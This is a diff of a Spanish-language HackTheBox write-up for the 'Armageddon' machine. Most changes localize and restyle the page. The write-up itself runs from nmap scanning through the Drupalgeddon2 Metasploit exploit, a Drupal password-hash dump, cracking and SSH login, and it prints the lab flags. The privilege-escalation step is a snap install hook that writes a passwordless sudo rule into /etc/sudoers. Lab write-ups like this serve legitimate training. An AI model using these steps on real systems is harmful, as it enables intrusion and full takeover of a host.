@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 
 <head>
   <title>
@@ -14,23 +14,23 @@
 
 <meta name="author" content="CeleroRKX">
 <meta name="description" content="Esta es una máquina Linux de nivel fácil de la plataforma HackTheBox">
-<meta name="keywords" content="blog,developer,personal">
+<meta name="keywords" content="ciberseguridad, pentesting, hacking ético, HackTheBox, writeups, redes, eJPT, CWES">
 
 
 
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Armageddon Machine - HackTheBox">
-  <meta name="twitter:description" content="Esta es una máquina Linux de nivel fácil de la plataforma HackTheBox">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="Armageddon Machine - HackTheBox">
+	<meta name="twitter:description" content="Esta es una máquina Linux de nivel fácil de la plataforma HackTheBox">
 
 <meta property="og:url" content="https://celero0.github.io/posts/armageddon/">
-  <meta property="og:site_name" content="Celero0 Blog">
-  <meta property="og:title" content="Armageddon Machine - HackTheBox">
-  <meta property="og:description" content="Esta es una máquina Linux de nivel fácil de la plataforma HackTheBox">
-  <meta property="og:locale" content="en_us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-11-25T23:27:52+00:00">
-    <meta property="article:modified_time" content="2025-11-25T23:27:52+00:00">
+	<meta property="og:site_name" content="Celero0 Blog">
+	<meta property="og:title" content="Armageddon Machine - HackTheBox">
+	<meta property="og:description" content="Esta es una máquina Linux de nivel fácil de la plataforma HackTheBox">
+	<meta property="og:locale" content="es">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2025-11-25T23:27:52+00:00">
+		<meta property="article:modified_time" content="2025-11-25T23:27:52+00:00">
 
 
 
@@ -45,7 +45,7 @@
 
   
   
-  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="/css/coder.min.7931813641e92789c3090650cf34e053bf0a09b258f1e73ca3b5ba54e5c35b4f.css" integrity="sha256-eTGBNkHpJ4nDCQZQzzTgU78KCbJY8ec8o7W6VOXDW08=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -55,13 +55,19 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
   
 
 
 
  
 
+
+  
+  
+    
+    <link rel="stylesheet" href="/scss/custom.min.940f835c40977fce2ddd2fd8c55eb94de7e488a3ba45c0396d26445901b77774.css" integrity="sha256-lA&#43;DXECXf84t3S/YxV65TefkiKO6RcA5bSZEWQG3d3Q=" crossorigin="anonymous" media="screen" />
+  
 
 
 
@@ -90,7 +96,7 @@
 
 
 
-<body class="preload-transitions colorscheme-auto">
+<body class="preload-transitions colorscheme-dark">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -117,6 +123,14 @@
           
             <li class="navigation-item">
               <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/labs/">Labs</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Proyectos</a>
             </li>
           
             <li class="navigation-item">
@@ -148,12 +162,12 @@
             <span class="posted-on">
               <i class="fa-solid fa-calendar" aria-hidden="true"></i>
               <time datetime="2025-11-25T23:27:52Z">
-                November 25, 2025
+                25 de noviembre de 2025
               </time>
             </span>
             <span class="reading-time">
               <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              3-minute read
+              3 minutos de lectura.
             </span>
           </div>
           
@@ -177,7 +191,7 @@
   </a>
 </h1>
 <p><strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.10.233 -oG allPorts
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.10.233 -oG allPorts
 </span></span></code></pre></div><p>El escaneo nos da bastante información, vemos que el gestor de contenido es <em>drupal 7</em>, que posee el <code>/robots.txt</code> y nos muestra rutas bastante interesantes.
 Además la versión de SSH es vulnerable a user enum.</p>
 <img src="/images/Pasted image 20250929200824.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -193,16 +207,16 @@ Además la versión de SSH es vulnerable a user enum.</p>
 <img src="/images/Pasted image 20250929201305.png" style="width:100%; height:auto; display:block; margin:auto;">
 Utilizaremos searchsploit para buscar vulnerabilidades, vemos drupalgeddon2 en metasploit
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit <span style="color:#a5d6ff">&#39;drupal&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit <span style="color:#a5d6ff">&#39;drupal&#39;</span>
 </span></span></code></pre></div><img src="/images/Pasted image 20250929201928.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto iremos a msfconsole a probar el exploit con el siguiente comando
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole
 </span></span><span style="display:flex;"><span>msf &gt; search drupal
 </span></span></code></pre></div><p>Vemos drupalgeddon 2, utilizaremos la opción 6
 <img src="/images/Pasted image 20250929202159.png" style="width:100%; height:auto; display:block; margin:auto;">
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf &gt; use <span style="color:#a5d6ff">6</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf &gt; use <span style="color:#a5d6ff">6</span>
 </span></span><span style="display:flex;"><span>msf &gt; set RHOSTS 10.10.10.233
 </span></span><span style="display:flex;"><span>msf &gt; set LHOST 10.10.14.2
 </span></span><span style="display:flex;"><span>msf &gt; set LPORT <span style="color:#a5d6ff">4444</span>
@@ -224,22 +238,22 @@ Utilizaremos searchsploit para buscar vulnerabilidades, vemos drupalgeddon2 en m
 <img src="/images/Pasted image 20250929203412.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
 <p>Ahora nos conectamos a la base de datos con las credenciales que obtuvimos con el siguiente comando
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -u drupaluser -p -h localhost drupal
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -u drupaluser -p -h localhost drupal
 </span></span></code></pre></div><img src="/images/Pasted image 20250929203547.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Como la consola es precaria no nos muestra los datos, para solucionar esto utilizaremos el comando SQL y luego algún comando inexistente junto con ;
 <img src="/images/Pasted image 20250929203644.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
 <p>Sabiendo el nombre de la base de datos, vemos las tablas de la base de datos drupal
 <img src="/images/Pasted image 20250929203800.png" style="width:100%; height:auto; display:block; margin:auto;">
 Encontramos la tabla <code>users</code>, por tanto mostraremos todos los valores dentro de esa tabla con el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-MYSQL" data-lang="MYSQL"><span style="display:flex;"><span><span style="color:#ff7b72">use</span><span style="color:#6e7681"> </span>drupal;<span style="color:#6e7681">
-</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#ff7b72">SELECT</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">FROM</span><span style="color:#6e7681"> </span>users;<span style="color:#6e7681">
-</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span>error;<span style="color:#6e7681">
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-MYSQL" data-lang="MYSQL"><span style="display:flex;"><span><span style="color:#ff7b72">use</span><span style="color:#6e7681"> </span>drupal;<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff7b72">SELECT</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">FROM</span><span style="color:#6e7681"> </span>users;<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span>error;<span style="color:#6e7681">
 </span></span></span></code></pre></div><p>Obtenemos el hash <code>$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt</code> del usuario <code>brucetherealadmin</code>
 <img src="/images/Pasted image 20250929204057.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
 <p>Lo guardaremos en hash.txt y utilizaremos john para cracker el hash, obteniendo la clave <code>booboo</code>
 <img src="/images/Pasted image 20250929204210.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
 <p>Ahora nos conectamos por ssh al usuario <code>brucetherealadmin</code> con la contraseña <code>booboo</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh brucetherealadmin@10.10.10.233
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh brucetherealadmin@10.10.10.233
 </span></span></code></pre></div><img src="/images/Pasted image 20250929204333.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Obtenemos la flag user.txt 4a6ee9ea61135bdc7fa9495cdeb23c7f
 <img src="/images/Pasted image 20250929204406.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
@@ -257,19 +271,19 @@ Encontramos la tabla <code>users</code>, por tanto mostraremos todos los valores
 <p>Siguiendo el paso a paso crearemos un packete para snap con fpm en nuestra máquina local, y posteriormente lo pasaremos hacia la máquina víctima</p>
 <p>Seguimos tal cual el paso a paso
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">COMMAND</span><span style="color:#ff7b72;font-weight:bold">=</span>id
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">COMMAND</span><span style="color:#ff7b72;font-weight:bold">=</span>id
 </span></span><span style="display:flex;"><span>mkdir -p snap/meta/hooks
 </span></span><span style="display:flex;"><span>cd snap
 </span></span><span style="display:flex;"><span>printf <span style="color:#a5d6ff">&#39;#!/bin/sh\n%s; false&#39;</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$COMMAND</span><span style="color:#a5d6ff">&#34;</span> &gt;meta/hooks/install
 </span></span></code></pre></div><img src="/images/Pasted image 20250929204836.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora utilizaremos nano para editar el comando que se correrá en la máquina víctima, en este caso le daremos permisos sudo para todo a nuestro usuario
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano meta/hooks/install
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano meta/hooks/install
 </span></span></code></pre></div><p>Esto permitirá que utilice sudo su root para cambiarse al usuario root</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#a5d6ff">&#34;brucetherealadmin ALL=(ALL:ALL) NOPASSWD:ALL&#34;</span> &gt;&gt; /etc/sudoers
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#a5d6ff">&#34;brucetherealadmin ALL=(ALL:ALL) NOPASSWD:ALL&#34;</span> &gt;&gt; /etc/sudoers
 </span></span></code></pre></div><p>Ahora le damos permiso de ejecución y creamos el archivo para pasarlo a la otra máquina
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x meta/hooks/install
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x meta/hooks/install
 </span></span><span style="display:flex;"><span>fpm -n xxxx -s dir -t snap -a all meta
 </span></span></code></pre></div><img src="/images/Pasted image 20250929205113.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora enviaremos el archivo xxxx_1.0_all.snap, primero hosteamos un servidor http con python3
@@ -277,7 +291,7 @@ Encontramos la tabla <code>users</code>, por tanto mostraremos todos los valores
 <p>En la máquina víctima usamos curl para descargar el archivo
 <img src="/images/Pasted image 20250929205304.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
 <p>Y ahora como aparece en gtfobins usaremos el comando adaptado a nuestro  sudo -l</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo snap install * --dangerous --devmode
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo snap install * --dangerous --devmode
 </span></span></code></pre></div><p>Una vez instalado hacemos sudo -l y vemos que tenemos permiso para todo sin contraseña
 <img src="/images/Pasted image 20250929211332.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
 <p>Hacemos sudo su root y cambiamos al usuario root
@@ -312,13 +326,13 @@ root.txt 3c1c704b2c52be33aec21343429d6b3a
   <section class="container">
     ©
     
-      2019 -
+      2025 -
     
     2026
      CeleroRKX 
     ·
     
-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
     
   </section>
 </footer>
@@ -332,6 +346,11 @@ root.txt 3c1c704b2c52be33aec21343429d6b3a
   <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
   
 
+  
+  
+  
+  <script src="/js/gestures.min.6cbd91590032e7f15addfe0af40403b55908afeef98fe1be098e196656366619.js" integrity="sha256-bL2RWQAy5/Fa3f4K9AQDtVkIr&#43;75j&#43;G&#43;CY4ZZlY2Zhk="></script>
+  
   
 
   
